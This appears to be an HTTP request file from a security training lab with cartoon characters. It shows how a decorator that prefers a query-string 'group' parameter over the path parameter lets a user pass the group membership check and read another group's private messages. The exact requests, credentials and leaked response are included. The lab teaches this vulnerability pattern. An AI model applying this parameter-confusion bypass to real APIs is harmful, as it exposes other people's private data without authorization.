### The group authorization check prevents Plankton from accessing the Krusty Krab's messages:
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in 403 Forbidden error:
#
# Forbidden: not an member for the requested group

###
# However, since the `@basic_auth_v2` decorator prioritizes the group from the query string
# over the one from the path while building the global context `g.group`, Plankton can present
# different `group` value to the authorization check and to the group messages retrieval, by adding
# a `group` query parameter with the value of his own group:
GET {{base}}/groups/staff@krusty-krab.sea/messages?group=staff@chum-bucket.sea
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
